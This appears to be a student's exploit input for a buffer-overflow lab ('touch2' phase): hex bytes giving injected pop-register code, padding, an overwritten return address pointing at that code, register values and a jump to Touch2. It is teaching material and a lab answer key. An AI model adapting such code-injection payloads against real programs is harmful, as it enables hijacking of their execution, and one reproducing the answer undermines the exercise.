/* Injected Code */
5f 5e 5a c3

/* Padding */
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00

/* Return Address: Injected Code */
48 c0 66 55 00 00 00 00

/* $rdi */
6f 7c 6c 48 00 00 00 00

/* $rsi */
b8 7c 6c 48 00 00 00 00

/* $rdx */
26 7c 6c 48 00 00 00 00

/* Return Address: Touch2 */
71 17 40 00 00 00 00 00
